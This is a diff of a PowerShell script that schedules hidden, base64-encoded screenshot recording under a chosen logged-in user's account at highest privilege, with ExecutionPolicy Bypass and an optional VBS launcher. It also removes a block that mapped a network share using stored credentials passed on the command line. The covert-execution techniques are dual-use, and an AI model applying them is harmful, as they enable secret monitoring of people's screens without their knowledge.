@@ -2,7 +2,9 @@
 
 
 function Invoke-MapRemoteDrive {
-    [CmdletBinding(SupportsShouldProcess)]
+
+    # TakeScreenshots.ps1
+    [CmdletBinding()]
     param()
 
 
@@ -26,47 +28,32 @@ function Invoke-MapRemoteDrive {
 }
 
 
-function Invoke-StartRecord {
+function Read-RecordLogFile {
     [CmdletBinding(SupportsShouldProcess)]
+    param()
+
+    $LogFile = "$ENV:Temp\task_record.log"
+    get-content "$LogFile" | Select -Last 10
+
+}
+
+function Invoke-StartRecord {
+    [CmdletBinding()]
     param(
         [Parameter(Mandatory = $false)]
         [ValidateRange(5, 120)]
         [int]$Minutes = 10,
         [Parameter(Mandatory = $false)]
         [ValidateRange(5, 120)]
-        [int]$Delay = 30
+        [int]$Delay = 30,
+        [Parameter(Mandatory = $false)]
+        [switch]$UseVbs
     )
     try {
-        $UseVbs = $True
 
 
+        $ScriptRecord = @"
 
-        $ScriptStartRecord = @"
-
-function Invoke-MapRemoteDrive {{
-    [CmdletBinding(SupportsShouldProcess)]
-    param()
-
-
-    `$NetExe = (Get-Command `"net.exe`").Source
-    `$Credz = Get-AppCredentials -Id `"mini.samba.shares`"
-    `$SmbUser = `$Credz.UserName
-    `$SmbPasswd = `$Credz.GetNetworkCredential().Password
-    `$UserOpt = '/USER:{0}' -f `$SmbUser
-    `$PersistOpt = `"/persistent:yes`"
-
-    `$letter = `"k:`"
-    `$path = `"\\10.0.0.138\RemoteScreenShots`"
-    & `"`$NetExe`" `"use`" `"`$letter`" `"`$path`" `"`$PersistOpt`" `"`$UserOpt`" `"`$SmbPasswd`"
-
-    if (`$? -eq `$True) {{
-        Write-Host `"Great!`" -f Darkgreen
-
-    }} else {{
-        Write-Host `"error`" -f DarkRed
-    }}
-}}
-Invoke-MapRemoteDrive
 
 function Add-TaskLog{{
     [CmdletBinding()]
@@ -74,9 +61,10 @@ function Add-TaskLog{{
         [Parameter(Mandatory = `$True, Position =0)]
         [string]`$LogMsg
     )
+    `$LogFile = `"`$ENV:Temp\task_record.log`"
     `$strtime = [datetime]::Now.GetDateTimeFormats()[19].Replace(`" `",`":`")
     
-    Add-Content -Path `"`$ENV:Temp\task_record.log`" -Value `"[`$strtime] `$LogMsg`"
+    Add-Content -Path `"`$LogFile`" -Value `"[`$strtime] `$LogMsg`"
 
 }}
 
@@ -145,12 +133,11 @@ Add-TaskLog `"Started`"
 Start-SaveScreenshots -Minutes {0} -Delay {1}
 
 "@
-
-
-        [string]$ScriptString = $ScriptStartRecord -f $Minutes, $Delay
+        $LogFile = "$ENV:Temp\task_record.log"
+        [string]$ScriptString = $ScriptRecord -f $Minutes, $Delay
 
         [string]$ScriptBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptString))
-        $now = [datetime]::Now.AddSeconds($Delay)
+        $now = [datetime]::Now.AddSeconds(10)
         # Example Usage
         $selectedUser = Select-LoggedInUser
         Write-Host "You selected: $selectedUser"
@@ -160,6 +147,7 @@ Start-SaveScreenshots -Minutes {0} -Delay {1}
         try {
             Write-Host "Unregister task $TaskName" -NoNewline -f DarkYellow
             Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Stop
+            Remove-SchedTasks -TaskName $TaskName
             Write-Host "Success" -f DarkGreen
         } catch {
             Write-Host "Failed" -f DarkRed
@@ -174,27 +162,27 @@ objShell.Run "powershell.exe -ExecutionPolicy Bypass -EncodedCommand $ScriptBase
         [string]$ArgumentString = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {0}" -f $ScriptBase64
         Write-host "Create Scheduled Task with Base64 Encoded Command"
 
+        if ($UseVbs) {
+            $VBSContent | Set-Content -Path $VBSFile -Encoding ASCII
+            
+            Write-Host "Create a Scheduled Task to Run the VBS Script"
+            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument `"$VBSFile`"
 
-        $VBSContent | Set-Content -Path $VBSFile -Encoding ASCII
-        [int]$rc = 15
-        Write-Host "Create a Scheduled Task to Run the VBS Script"
-        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument `"$VBSFile`"
-
-        #$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64"
+        } else {
+            $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64"
+        }
 
 
-        $ts = New-TimeSpan -Minutes 1
-
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
         $Trigger = New-ScheduledTaskTrigger -At $now -Once:$false
         $Principal = New-ScheduledTaskPrincipal -UserId "$selectedUser" -LogonType Interactive -RunLevel Highest
-        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
+        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal
 
         write-host "Register and Run Task"
         Register-ScheduledTask -TaskName $TaskName -InputObject $Task | Out-Null
+        Add-SchedTasks -TaskName $TaskName
         Start-ScheduledTask -TaskName $TaskName
 
-        Write-Host "In 10 seconds... $ENV:Temp\task_record.log"
+        Write-Host "In 10 seconds... $LogFile"
 
     } catch {
         write-error "$_"
@@ -202,18 +190,8 @@ objShell.Run "powershell.exe -ExecutionPolicy Bypass -EncodedCommand $ScriptBase
 
 }
 
-function Read-RecordLogFile {
-    [CmdletBinding(SupportsShouldProcess)]
-    param()
-
-    $LogFile = "$ENV:Temp\task_record.log"
-    get-content "$LogFile" | Select -Last 10
-
-}
-
-
 function Invoke-StopRecord {
-    [CmdletBinding(SupportsShouldProcess)]
+    [CmdletBinding()]
     param(
         [Parameter(Mandatory = $false)]
         [ValidateRange(5, 120)]
@@ -229,6 +207,7 @@ function Invoke-StopRecord {
             Stop-ScheduledTask -TaskName $TaskName -ErrorAction Stop
             Write-Host "Unregister task $TaskName" -NoNewline -f DarkYellow
             Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Stop
+            Remove-SchedTasks -TaskName $TaskName
             Write-Host "Success" -f DarkGreen
         } catch {
             Write-Host "Failed" -f DarkRed
